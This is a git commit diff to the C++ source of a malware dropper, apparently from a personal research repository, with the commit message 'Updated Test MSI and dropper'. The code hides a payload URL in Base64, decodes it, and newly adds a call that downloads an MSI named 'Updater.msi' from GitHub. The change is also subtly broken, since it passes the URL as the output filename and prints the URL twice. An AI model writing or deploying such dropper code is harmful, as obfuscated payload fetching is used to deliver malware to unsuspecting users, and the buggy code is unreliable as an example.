39831291e023e2428789d43690220a75b466aa8d
Alekzandr <kyle.topasna@gmail.com>
2023-10-28 23:34:18 -0800

    Updated Test MSI and dropper

--- IDAT/Dropper/dropper/main.cpp
+++ IDAT/Dropper/dropper/main.cpp
@@ -1,11 +1,11 @@
 #include <iostream>
-
 #include "Base64Helper.h"
+#include "Downloader.h"
 
 
 
 int main() {
-
+	// Encoded Variables
 	std::string encodedMsiUrl = "aHR0cHM6Ly9naXRodWIuY29tL2FsZWt6YW5kci9SZXNlYXJjaC9JREFUL1VwZGF0ZXIubXNp"; // https://github.com/alekzandr/Research/IDAT/Updater.msi
 	std::string decodedMsiUrl = Base64Decode(encodedMsiUrl);
 
@@ -13,7 +13,15 @@ int main() {
 	std::string decodedMsiFileName = Base64Decode(encodedMsiFileName);
 
 	std::cout << "Decoded: " << decodedMsiUrl << std::endl;
-	std::cout << "Decoded: " << decodedMsiFileName << std::endl;
+	std::cout << "Decoded: " << decodedMsiUrl << std::endl;
+
+	// Download MSI File
+	if (downloadFile(decodedMsiUrl, decodedMsiUrl)) {
+		std::cout << "Download successful!" << std::endl;
+	}
+	else {
+		std::cout << "Download failed." << std::endl;
+	}
 
 	return 0;
 
